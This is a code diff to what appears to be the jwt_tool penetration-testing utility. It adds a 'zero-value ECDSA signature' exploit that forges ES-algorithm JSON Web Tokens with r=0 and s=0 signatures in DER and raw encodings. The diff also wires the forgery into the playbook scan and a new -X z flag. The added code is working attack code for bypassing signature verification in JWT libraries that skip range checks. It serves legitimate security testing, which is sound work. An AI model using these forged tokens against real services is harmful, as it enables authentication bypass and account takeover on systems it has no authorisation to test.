@@ -302,6 +302,23 @@ def checkPsySig(headDict, paylB64):
     jwtPsy = newHead+"."+paylB64+".MAYCAQACAQA"
     return jwtPsy
 
+def checkZeroECSig(headDict, paylB64):
+    # ECDSA zero-value signature bypass: forge a signature whose r and s
+    # integers are both 0. Some verifiers skip the ECDSA range checks
+    # (1 <= r,s <= n-1) before the public-key math and accept it.
+    alg = headDict["alg"]
+    curveSize = int(alg[2:])
+    # DER-encoded ECDSA-Sig-Value: INTEGER r (0), INTEGER s (0)
+    derZeroSig = b"0\x06\x02\x01\x00\x02\x01\x00"
+    # IEEE P1363/raw fixed-length encoding: r and s zero-padded to the curve size
+    rawZeroSig = b"\x00" * (2 * (curveSize // 8))
+    sigs = []
+    for zeroSig in (derZeroSig, rawZeroSig):
+        newHead = buildHead(alg, headDict)
+        jwtZero = newHead+"."+paylB64+"."+base64.urlsafe_b64encode(zeroSig).decode('UTF-8').strip("=")
+        sigs.append(jwtZero)
+    return sigs
+
 def checkAlgNone(headDict, paylB64):
     alg1 = "none"
     newHead1 = buildHead(alg1, headDict)
@@ -1426,6 +1443,12 @@ def scanModePlaybook():
     # Exploit: Psychic Signature for ECDSA (CVE-2022-21449)
     psySig = checkPsySig(headDict, paylB64)
     jwtOut(psySig, "Exploit: 'Psychic Signature' accepted in ECDSA signing (-X p)", "Testing if the ECDSA signing process can be fooled (CVE-2022-21449)")
+    # Exploit: zero-value ECDSA signature (r=0, s=0)
+    if headDict['alg'][:2] == "ES" or headDict['alg'][:2] == "es":
+        jwtZeroToks = checkZeroECSig(headDict, paylB64)
+        zippedZeroToks = dict(zip(jwtZeroToks, ["DER-encoded zero signature", "raw (IEEE P1363) zero signature"]))
+        for jwtZero in zippedZeroToks:
+            jwtOut(jwtZero, "Exploit: Zero-value ECDSA signature (-X z) - "+zippedZeroToks[jwtZero], "Testing whether the verifier accepts an ECDSA signature with r=0, s=0 (missing range checks)")
     # Exploit: null signature
     jwtNull = checkNullSig(contents)
     jwtOut(jwtNull, "Exploit: Null signature (-X n)", "This token was sent to check if a null signature can bypass checks")
@@ -1753,6 +1776,16 @@ def runExploits():
             jwtPsy = checkPsySig(headDict, paylB64)
             desc = "EXPLOIT: Psychic Signature (CVE-2022-21449)\n(This will only be valid on unpatched implementations of JWT.)"
             jwtOut(jwtPsy, "Exploit: Psychic Signature (CVE-2022-21449)", desc)
+        elif args.exploit == "z":
+            if headDict["alg"][:2] not in ("ES", "es"):
+                cprintc("Zero-value ECDSA signature attack only applies to ES256/ES384/ES512 tokens (current alg: "+headDict["alg"]+")\n", "red")
+                parser.print_usage()
+            else:
+                jwtZeroToks = checkZeroECSig(headDict, paylB64)
+                zippedToks = dict(zip(jwtZeroToks, ["DER-encoded zero signature", "raw (IEEE P1363) zero signature"]))
+                for jwtZero in zippedToks:
+                    desc = "EXPLOIT: ECDSA zero-value signature (r=0, s=0) - "+zippedToks[jwtZero]+"\n(This will only be valid on implementations that skip ECDSA signature range checks.)"
+                    jwtOut(jwtZero, "Exploit: Zero-value ECDSA signature (r=0, s=0) - "+zippedToks[jwtZero], desc)
         elif args.exploit == "b":
             key = ""
             newSig, newContents = signTokenHS(headDict, paylDict, key, 256)
@@ -1876,7 +1909,7 @@ if __name__ == '__main__':
     parser.add_argument("-M", "--mode", action="store",
                         help="Scanning mode:\npb = playbook audit\ner = fuzz existing claims to force errors\ncc = fuzz common claims\nat - All Tests!")
     parser.add_argument("-X", "--exploit", action="store",
-                        help="eXploit known vulnerabilities:\na = alg:none\nn = null signature\nb = blank password accepted in signature\np = 'psychic signature' accepted in ECDSA signing\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS")
+                        help="eXploit known vulnerabilities:\na = alg:none\nn = null signature\nb = blank password accepted in signature\np = 'psychic signature' accepted in ECDSA signing\nz = zero-value ECDSA signature (r=0, s=0) signature bypass\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS")
     parser.add_argument("-ju", "--jwksurl", action="store",
                         help="URL location where you can host a spoofed JWKS")
     parser.add_argument("-S", "--sign", action="store",
@@ -2092,9 +2125,9 @@ if __name__ == '__main__':
         else:
             config['argvals']['scanMode'] = args.mode
     if args.exploit:
-        if args.exploit not in ['a', 'n', 'b', 's', 'i', 'k', 'p']:
+        if args.exploit not in ['a', 'n', 'b', 's', 'i', 'k', 'p', 'z']:
             parser.print_usage()
-            cprintc("\nPlease choose an exploit (e.g. -X a):\na = alg:none\nn = null signature\nb = blank password accepted in signature\np = 'psychic signature' accepted in ECDSA signing\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS", "red")
+            cprintc("\nPlease choose an exploit (e.g. -X a):\na = alg:none\nn = null signature\nb = blank password accepted in signature\np = 'psychic signature' accepted in ECDSA signing\nz = zero-value ECDSA signature (r=0, s=0) signature bypass\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS", "red")
             exit(1)
         else:
             config['argvals']['exploitType'] = args.exploit
